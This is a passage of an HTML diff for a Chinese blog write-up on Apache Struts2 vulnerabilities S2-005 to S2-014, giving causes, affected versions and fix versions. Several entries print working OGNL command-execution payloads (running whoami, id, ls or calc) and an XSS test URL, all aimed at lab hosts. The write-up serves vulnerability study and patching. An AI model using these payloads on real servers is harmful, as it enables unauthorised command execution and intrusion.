+<h5 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>更新至Struts 2.2.1之后</p>
+<h5 id="参考-4"><a href="#参考-4" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-005</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2011-1772"><a href="#CVE-2011-1772" class="headerlink" title="CVE-2011-1772"></a>CVE-2011-1772</h4><p>S2-006</p>
+<h5 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p><code>XWork</code>生成错误页面时的XSS漏洞</p>
+<p>XWork默认未过滤action的名字，导致允许xss。</p>
+<h5 id="影响范围-5"><a href="#影响范围-5" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.2.1.1</p>
+<h5 id="漏洞原理-5"><a href="#漏洞原理-5" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p> XWork默认未过滤action的名字，导致允许xss。</p>
+<h5 id="漏洞条件-5"><a href="#漏洞条件-5" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.2.1.1</p>
+<h5 id="漏洞检测-5"><a href="#漏洞检测-5" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.184:8080&#x2F;struts2-blank&#x2F;home.action!login:cantLogin&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&#x3D;some_value</span><br></pre></td></tr></table></figure>
+
+<p>目前无法复现，更多参考此漏洞介绍。</p>
+<h5 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.2.3版本之后已修复</p>
+<h5 id="参考-5"><a href="#参考-5" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-006</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2012-0838"><a href="#CVE-2012-0838" class="headerlink" title="CVE-2012-0838"></a>CVE-2012-0838</h4><p>S2-007</p>
+<h5 id="漏洞描述-6"><a href="#漏洞描述-6" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>当配置验证规则，类型转换出错时，进行了错误的字符串拼接，进而造成了OGNL语句的执行；导致漏洞产生。</p>
+<h5 id="影响范围-6"><a href="#影响范围-6" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.2.3</p>
+<h5 id="漏洞原理-6"><a href="#漏洞原理-6" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>当配置验证规则，类型转换出错时，进行了错误的字符串拼接，进而造成了OGNL语句的执行；导致漏洞产生。</p>
+<p>当用户提交为字符串而非整形数值时，后端用代码拼接<code>&quot;&#39;&quot; + value + &quot;&#39;&quot;</code> 然后对其进行 OGNL 表达式解析.</p>
+<h5 id="漏洞条件-6"><a href="#漏洞条件-6" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.2.3</p>
+<h5 id="漏洞检测-6"><a href="#漏洞检测-6" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、docker环境</p>
+<p><img src="/images/Struts2/image-20210218163747418.png" alt="image-20210218163747418"></p>
+<center>提交字符串会报错</center>
+2、payload测试
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 需经过URL编码</span><br><span class="line"><span class="string">&#x27;+++(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new+java.lang.Boolean(&quot;false&quot;)+,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;</span>ls /<span class="string">&#x27;).getInputStream()))+++&#x27;</span></span><br><span class="line"></span><br><span class="line"># URL已编码</span><br><span class="line">%<span class="number">27</span>+%<span class="number">2</span>B+%<span class="number">28</span>%<span class="number">23</span>_memberAccess%<span class="number">5</span>B%<span class="number">22</span>allowStaticMethodAccess%<span class="number">22</span>%<span class="number">5D</span>%<span class="number">3D</span><span class="keyword">true</span>%<span class="number">2</span>C%<span class="number">23f</span>oo%<span class="number">3D</span>new+java.lang.Boolean%<span class="number">28</span>%<span class="number">22f</span>alse%<span class="number">22</span>%<span class="number">29</span>+%<span class="number">2</span>C%<span class="number">23</span>context%<span class="number">5</span>B%<span class="number">22</span>xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>%<span class="number">5D</span>%<span class="number">3D</span>%<span class="number">23f</span>oo%<span class="number">2</span>C%<span class="number">40</span>org.apache.commons.io.IOUtils%<span class="number">40</span>toString%<span class="number">28</span>%<span class="number">40</span>java.lang.Runtime%<span class="number">40</span>getRuntime%<span class="number">28</span>%<span class="number">29.</span>exec%<span class="number">28</span>%<span class="number">27l</span>s%<span class="number">20</span>/%<span class="number">27</span>%<span class="number">29.</span>getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">29</span>+%<span class="number">2</span>B+%<span class="number">27</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210218163918936.png" alt="image-20210218163918936"></p>
+<h5 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.2.3.1版本之后均不存在此漏洞</p>
+<h5 id="参考-6"><a href="#参考-6" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-007</span><br></pre></td></tr></table></figure>
+
+<h4 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h4><h5 id="漏洞描述-7"><a href="#漏洞描述-7" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>根据官网介绍S2-008包含三种类型漏洞：</p>
+<p>1、第一种和S2-007漏洞类型一致，OGNL表达式报错导致漏洞。</p>
+<p>2、利用Cookie方式，虽在Struts2没有对恶意代码进行限制，但是java的webserver（Tomcat），对cookie的名称有较多限制，在传入struts2之前就被处理，有些鸡肋。</p>
+<p>3、目标服务需开启<code>devMode</code>的debug模式</p>
+<h5 id="影响范围-7"><a href="#影响范围-7" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.3.17</p>
+<h5 id="漏洞原理-7"><a href="#漏洞原理-7" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>根据官网介绍S2-008包含三种类型漏洞：</p>
+<p>这里使用如下方式来验证漏洞。</p>
+<p>3、目标服务需开启<code>devMode</code>的debug模式,通过<code>statck.findValue</code>即可执行OGNL表达式，造成代码执行</p>
+<h5 id="漏洞条件-7"><a href="#漏洞条件-7" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.3.17</p>
+<h5 id="漏洞检测-7"><a href="#漏洞检测-7" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、漏洞环境</p>
+<p><code>Win 7</code> + <code>java version &quot;1.6.0_45&quot;</code> + <code>Tomcat 6.0.9</code> + <code>Struts 2.1.6</code></p>
+<p>2、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.186:8080&#x2F;struts2-showcase-2.1.6&#x2F;showcase.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219105744421.png" alt="image-20210219105744421"></p>
+<p>3、payload测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.186:8080&#x2F;struts2-showcase-2.1.6&#x2F;showcase.action?debug&#x3D;command&amp;expression&#x3D;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]%3Dtrue%2C%23foo%3Dnew java.lang.Boolean(&quot;false&quot;) %2C%23context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;).getInputStream()))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219105834613.png" alt="image-20210219105834613"></p>
+<p>4、获取主机名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.186:8080&#x2F;struts2-showcase-2.1.6&#x2F;home.action?debug&#x3D;command&amp;expression&#x3D;%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnew java.io.InputStreamReader%28%23a%29%2c%23c%3dnew java.io.BufferedReader%28%23b%29%2c%23d%3dnew char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219113057930.png" alt="image-20210219113057930"></p>
+<h5 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.3.1.1版本之后均已修复此漏洞</p>
+<h5 id="参考-7"><a href="#参考-7" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-008</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2011-3923"><a href="#CVE-2011-3923" class="headerlink" title="CVE-2011-3923"></a>CVE-2011-3923</h4><p>S2-009</p>
+<h5 id="漏洞描述-8"><a href="#漏洞描述-8" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>此漏洞针对S2-003和S2-005之后，攻击者又发现了一种新的绕过<code>ParametersInterceptor</code>正则保护的攻击方式.</p>
+<p>Struts2对S2-003的修复方法是禁止<code>#</code>号，于是s2-005通过使用编码\u0023或\43来绕过；后来Struts2对S2-005的修复方法是禁止<code>\</code>等特殊符号，使用户不能提交反斜线。</p>
+<p>当传入<code>(ONGL)(1)</code>时，会将前者视为<code>ONGL</code>表达式来执行，从而绕过了正则的匹配保护。而且由于其在HTTP参数值中，也可以进一步绕过字符串限制的保护。</p>
+<h5 id="影响范围-8"><a href="#影响范围-8" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.3.1.1</p>
+<h5 id="漏洞原理-8"><a href="#漏洞原理-8" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p><code>ParametersInterceptor</code>正则防护中会将<code>top [&#39;foo&#39;](0)</code>作为有效的表达式匹配，OGNL将其作为<code>(top [&#39;foo&#39;])(0)</code>处理，并将“foo”操作参数的值作为OGNL表达式求值。这使得恶意用户将任意的OGNL语句放入由操作公开的任何String变量中，并将其评估为OGNL表达式，并且由于OGNL语句在HTTP参数中，攻击者可以使用黑名单字符（例如＃）禁用方法执行并执行任意方法，绕过<code>ParametersInterceptor</code>和<code>OGNL</code>库防护.</p>
+<p>触发地址<code>/ajax/example5.action</code></p>
+<h5 id="漏洞条件-8"><a href="#漏洞条件-8" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.3.1.1</p>
+<h5 id="漏洞检测-8"><a href="#漏洞检测-8" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、环境</p>
+<p><code>Win 7</code> + <code>JDK</code> + <code>Tomcat 6.0.9</code> + <code>Struts 2.0.11.2</code></p>
+<p>2、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.188:8080&#x2F;struts2-showcase-2.0.11.2&#x2F;ajax&#x2F;example5.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219141708098.png" alt="image-20210219141708098"></p>
+<p>3、payload测试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.5.188:8080/struts2-showcase-2.0.11.2/ajax/example5.action?age=12313&amp;name=(%23context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=+new+java.lang.Boolean(false),+%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,+%23a=@java.lang.Runtime@getRuntime().exec(&quot;whoami&quot;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(&#x27;meh&#x27;)]</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219140634654.png" alt="image-20210219140634654"></p>
+<p>获取主机名信息</p>
+<p><img src="/images/Struts2/image-20210219140716338.png" alt="image-20210219140716338"></p>
+<h5 id="漏洞修复-8"><a href="#漏洞修复-8" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.3.1.2版本之后已修复</p>
+<h5 id="参考-8"><a href="#参考-8" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-009</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2012-4386"><a href="#CVE-2012-4386" class="headerlink" title="CVE-2012-4386"></a>CVE-2012-4386</h4><p>S2-010</p>
+<h5 id="漏洞描述-9"><a href="#漏洞描述-9" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>当使用Struts 2令牌机制进行CSRF保护时，可能会通过滥用已知的会话属性来绕过令牌检查。</p>
+<h5 id="影响范围-9"><a href="#影响范围-9" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.3.4</p>
+<h5 id="漏洞原理-9"><a href="#漏洞原理-9" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>当使用Struts 2令牌机制进行CSRF保护时，可能会通过滥用已知的会话属性来绕过令牌检查。</p>
+<h5 id="漏洞条件-9"><a href="#漏洞条件-9" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.3.4</p>
+<h5 id="漏洞检测-9"><a href="#漏洞检测-9" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>漏洞无法根据现有环境进行复现，如有需要还请自行进行环境搭建复测。</p>
+<h5 id="漏洞修复-9"><a href="#漏洞修复-9" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.3.4.1版本之后已修复</p>
+<h5 id="参考-9"><a href="#参考-9" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-010</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2012-4387"><a href="#CVE-2012-4387" class="headerlink" title="CVE-2012-4387"></a>CVE-2012-4387</h4><p>S2-011</p>
+<h5 id="漏洞描述-10"><a href="#漏洞描述-10" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Struts2处理的请求参数被视为OGNL表达式；DOS攻击可能会使用非常长的参数名对基于Struts 2的应用程序创建请求。</p>
+<h5 id="影响范围-10"><a href="#影响范围-10" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.3.4</p>
+<h5 id="漏洞原理-10"><a href="#漏洞原理-10" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Struts2处理的请求参数被视为OGNL表达式；DOS攻击可能会使用非常长的参数名对基于Struts 2的应用程序创建请求。</p>
+<h5 id="漏洞条件-10"><a href="#漏洞条件-10" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.3.4</p>
+<h5 id="漏洞检测-10"><a href="#漏洞检测-10" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>漏洞无法根据现有环境进行复现，如有需要还请自行进行环境搭建复测。</p>
+<h5 id="漏洞修复-10"><a href="#漏洞修复-10" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.3.4.1版本已修复</p>
+<h5 id="参考-10"><a href="#参考-10" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-011</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2013-1965"><a href="#CVE-2013-1965" class="headerlink" title="CVE-2013-1965"></a>CVE-2013-1965</h4><p>S2-012</p>
+<h5 id="漏洞描述-11"><a href="#漏洞描述-11" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>在S2-003，S2-005和S2-009中已经解决了OGNL评估问题，但是，由于它只涉及参数名称，因此结果得出的修复是基于将可接受的参数名称列入白名单并拒绝对参数中包含的表达式进行评估名称，仅关闭了部分漏洞。</p>
+<p>当重定向结果从堆栈中读取并使用先前注入的代码作为重定向参数时，将进行第二次评估。<br>这使恶意用户可以将任意OGNL语句放入由操作公开的任何未过滤的String变量中，并将其评估为OGNL表达式，以启用方法执行并执行任意方法，从而绕过Struts和OGNL库保护。</p>
+<p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">&quot;S2-012&quot;</span> extends=<span class="string">&quot;struts-default&quot;</span>&gt;</span><br><span class="line">&lt;action name=<span class="string">&quot;user&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.demo.action.UserAction&quot;</span>&gt;</span><br><span class="line">&lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt;</span><br><span class="line">&lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">&lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">&lt;/action&gt;</span><br><span class="line">&lt;/package&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。</p>
+<h5 id="影响范围-11"><a href="#影响范围-11" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2 </p>
+<h5 id="漏洞原理-11"><a href="#漏洞原理-11" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>描述参考如上</p>
+<p>触发地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.188:8080&#x2F;struts2-showcase-2.1.6&#x2F;skill&#x2F;edit.action</span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞条件-11"><a href="#漏洞条件-11" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2 </p>
+<h5 id="漏洞检测-11"><a href="#漏洞检测-11" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、环境</p>
+<p><code>Win 7</code> + <code>JDK</code> + <code>Tomcat 6.0.9</code> + <code>Struts 2.1.6</code></p>
+<p>2、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.188:8080&#x2F;struts2-showcase-2.1.6&#x2F;skill&#x2F;edit.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219150037781.png" alt="image-20210219150037781"></p>
+<p>3、提交POST</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentSkill.name=currentSkill.name=%<span class="number">25</span>%<span class="number">7</span>B%<span class="number">23</span>a%<span class="number">3D</span>%<span class="number">28</span>new%<span class="number">20</span>java.lang.ProcessBuilder%<span class="number">28</span>new%<span class="number">20</span>java.lang.String%<span class="number">5</span>B%<span class="number">5D</span>%<span class="number">7</span>B%<span class="number">22</span>cmd.exe%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">22</span>%<span class="number">2f</span>c%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">22</span>whoami%<span class="number">22</span>%<span class="number">7D</span>%<span class="number">29</span>%<span class="number">29.</span>redirectErrorStream%<span class="number">28</span><span class="keyword">true</span>%<span class="number">29.</span>start%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23</span>b%<span class="number">3D</span>%<span class="number">23</span>a.getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23</span>c%<span class="number">3D</span>new%<span class="number">20</span>java.io.InputStreamReader%<span class="number">28</span>%<span class="number">23</span>b%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23d</span>%<span class="number">3D</span>new%<span class="number">20</span>java.io.BufferedReader%<span class="number">28</span>%<span class="number">23</span>c%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23</span>e%<span class="number">3D</span>new%<span class="number">20</span><span class="keyword">char</span>%<span class="number">5</span>B500%<span class="number">5D</span>%<span class="number">2</span>C%<span class="number">23d</span>.read%<span class="number">28</span>%<span class="number">23</span>e%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23f</span>%<span class="number">3D</span>%<span class="number">23</span>context.get%<span class="number">28</span>%<span class="number">22</span>com.opensymphony.xwork2.dispatcher.HttpServletResponse%<span class="number">22</span>%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23f</span>.getWriter%<span class="number">28</span>%<span class="number">29.</span>println%<span class="number">28</span>new%<span class="number">20</span>java.lang.String%<span class="number">28</span>%<span class="number">23</span>e%<span class="number">29</span>%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23f</span>.getWriter%<span class="number">28</span>%<span class="number">29.f</span>lush%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23f</span>.getWriter%<span class="number">28</span>%<span class="number">29.</span>close%<span class="number">28</span>%<span class="number">29</span>%<span class="number">7D</span>&amp;currentSkill.description=aaaa</span><br></pre></td></tr></table></figure>
+
+<p>4、payload结果如下</p>
+<p><img src="/images/Struts2/image-20210219150117924.png" alt="image-20210219150117924"></p>
+<h5 id="漏洞修复-11"><a href="#漏洞修复-11" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.3.14.1版本之后已修复</p>
+<h5 id="参考-11"><a href="#参考-11" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-012</span><br><span class="line">https:&#x2F;&#x2F;copyfuture.com&#x2F;blogs-details&#x2F;20200910115826642xohc6wpnns9lsf8</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2013-1966"><a href="#CVE-2013-1966" class="headerlink" title="CVE-2013-1966"></a>CVE-2013-1966</h4><p>S2-013</p>
+<h5 id="漏洞描述-12"><a href="#漏洞描述-12" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Struts2标签库中的url标签和a标签的includeParams这个属性，代表显示请求访问参数的含义，一旦它的值被赋予ALL或者GET或者 POST，就会显示具体请求参数内容。按照正常的需求，把参数urlEncode一下也就够了， 问题在于，Struts竟然多做了一步，把参数做了OGNL解析！</p>
+<h5 id="影响范围-12"><a href="#影响范围-12" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.3.14.1</p>
+<h5 id="漏洞原理-12"><a href="#漏洞原理-12" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p><code>&lt;s:a&gt;</code>用来显示一个超链接，当<code>includeParams=all</code>的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。</p>
+<p>触发位置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">link.action?a&#x3D;%24%7B1%2b1%7D</span><br><span class="line">URLDecode</span><br><span class="line">link.action?a&#x3D;$&#123;1+1&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞条件-12"><a href="#漏洞条件-12" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.3.14.1</p>
+<h5 id="漏洞检测-12"><a href="#漏洞检测-12" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、环境</p>
+<p>docker</p>
+<p>2、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8080&#x2F;S2-013&#x2F;link.action?a&#x3D;%24%7B1%2b1%7D</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219165035971.png" alt="image-20210219165035971"></p>
+<p>3、payload测试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.20.120:8080/S2-013/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#x27;id&#x27;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#x27;dbapp%3D&#x27;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219165204140.png" alt="image-20210219165204140"></p>
+<p><img src="/images/Struts2/image-20210219165249442.png" alt="image-20210219165249442"></p>
+<h5 id="漏洞修复-12"><a href="#漏洞修复-12" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.3.14.1版本之后已修复</p>
+<h5 id="参考-12"><a href="#参考-12" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-013</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2013-2115"><a href="#CVE-2013-2115" class="headerlink" title="CVE-2013-2115"></a>CVE-2013-2115</h4><p>S2-014</p>
+<h5 id="漏洞描述-13"><a href="#漏洞描述-13" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 <code>$&#123;ognl_exp&#125;</code>OGNL 表达式执行的方式，因此 S2-014 是对其的补丁加强。</p>
+<h5 id="影响范围-13"><a href="#影响范围-13" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.3.14.1</p>
+<h5 id="漏洞原理-13"><a href="#漏洞原理-13" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>参考CVE-2013-1966介绍。</p>
+<h5 id="漏洞条件-13"><a href="#漏洞条件-13" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.3.14.1</p>
